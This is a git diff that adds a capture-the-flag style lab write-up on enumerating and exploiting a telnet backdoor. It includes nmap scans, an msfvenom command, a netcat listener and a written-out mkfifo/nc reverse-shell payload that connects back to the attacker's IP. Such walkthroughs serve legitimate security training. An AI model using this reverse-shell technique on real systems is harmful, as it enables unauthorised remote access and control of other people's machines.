@@ -246,13 +246,159 @@ Encryption
 
 ## Enumerating Telnet
 
-The MACHINE_IP at my time is `10.201.105.163`
+The MACHINE_IP at my time is `10.201.19.174`
 
 ### Answer the questions below
 
 1. How many ports are open on the target machine? Note: you may need to scan non-standard ports too.
 
+1
 
+Doing nmap scan to check all the ports `nmap -p- --min-rate 1000 -T4 10.201.19.174`
+
+<img width="361" height="101" alt="image" src="https://github.com/user-attachments/assets/dc7fd19d-56ff-47db-80d2-94ce57919ac4" />
+
+2. What port is this?
+
+8012
+
+3. This port is unassigned, but still lists the protocol it's using, what protocol is this?
+
+TCP
+
+4. Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
+
+0 
+
+Doing nmap scan without the `-p-` tag `nmap 10.201.19.174`
+
+<img width="332" height="82" alt="image" src="https://github.com/user-attachments/assets/f52dee71-d76b-42f9-92fb-48d4ee693125" />
+
+5. Based on the title returned to us, what do we think this port could be used for?
+
+A Backdoor
+
+Doing nmap scan to check the service and version of this specific port `nmap -sC -sV -p8012 10.201.19.174`
+
+<img width="359" height="160" alt="image" src="https://github.com/user-attachments/assets/e77876c6-eb09-422a-9e9f-4ccf14adb1e0" />
+
+6. Who could it belong to? Gathering possible usernames is an important step in enumeration.
+
+Skidy
+
+As it says SKIDY'S BACKDOOR so the username is Skidy.
+
+## Exploiting Telnet
+
+### Types of Telnet Exploit
+
+Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.
+
+There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:
+- [CVE Details](https://www.cvedetails.com/)
+- [Mitre CVE](https://cve.mitre.org/)
+
+A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.
+
+### Method Breakdown
+
+So, from our enumeration stage, we know:
+- There is a poorly hidden telnet service running on this machine
+- The service itself is marked "backdoor"
+- We have possible username of "Skidy" implicated
+
+Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!
+
+### Connecting to Telnet
+
+You can connect to a telnet server with the following syntax: `telnet [ip] [port]`
+
+### What is a Reverse Shell?
+
+A shell can be described as a piece of code or program which can be used to gain code or command execution on a device.
+
+A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.
+
+The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.
+
+<img width="632" height="165" alt="image" src="https://github.com/user-attachments/assets/a6db3e0e-3240-40c8-ba18-5722331c30b7" />
+
+### Answer the questions below
+
+1. Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.
+
+`telnet 10.201.19.174 8012`
+
+<img width="230" height="64" alt="image" src="https://github.com/user-attachments/assets/ada86267-a9a8-46a2-bce7-b58e042deb6a" />
+
+2. Great! It's an open telnet connection! What welcome message do we receive?
+
+SKIDY'S BACKDOOR.
+
+3. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
+
+N
+
+I tried `ls` but it gives nothing
+
+4. Start a tcpdump listener on your local machine.
+
+If using your own machine with the OpenVPN connection, use: `sudo tcpdump ip proto \\icmp -i tun0`
+
+If using the AttackBox, use: `sudo tcpdump ip proto \\icmp -i ens5`
+
+This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
+
+In linux machine `sudo tcpdump ip proto \\icmp -i tun0`
+
+<img width="358" height="56" alt="image" src="https://github.com/user-attachments/assets/e6f26cea-5107-401b-87d9-473af32655a4" />
+
+
+5. Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
+
+Y
+
+Use `.RUN ping YOUR_TUN0_IP -c 1`
+
+<img width="418" height="58" alt="image" src="https://github.com/user-attachments/assets/bb60e830-5224-4c25-9171-18505aab2808" />
+
+This confirms that we can use commands on the telnet machine by putting a listener to get results of that command
+
+6. We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+
+`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"`
+- `-p` = payload
+- `lhost` = our local host IP address (this is your machine's IP address)
+- `lport` = the port to listen on (this is the port on your machine)
+- `R` = export the payload in raw format
+
+What word does the generated payload start with?
+
+mkfifo
+
+Use this on the linux machine to get the payload `msfvenom -p cmd/unix/reverse_netcat lhost=YOUR_TUN0_IP lport=4444 R`
+
+<img width="440" height="74" alt="image" src="https://github.com/user-attachments/assets/477ddbde-fa31-4a5c-ada5-3b2f8ba4c9b4" />
+
+7. Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
+
+`nc -lvnp [listening port]`
+
+What would the command look like for the listening port we selected in our payload?
+
+`nc -lvnp 4444`
+
+8. Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
+
+Using `.RUN mkfifo /tmp/cqrst; nc 10.17.9.224 4444 0</tmp/cqrst | /bin/sh >/tmp/cqrst 2>&1; rm /tmp/cqrst` payload in the telnet machine with .RUN
+
+And a listening port in the linux machine `nc -lvnp 4444` 
+
+You get connected to the mahine and get the shell!
+
+9. Success! What is the contents of flag.txt?
+
+<img width="307" height="114" alt="image" src="https://github.com/user-attachments/assets/82027b98-5209-4208-82d9-e2b0dfd06efe" />
 
 ## Understanding FTP
 
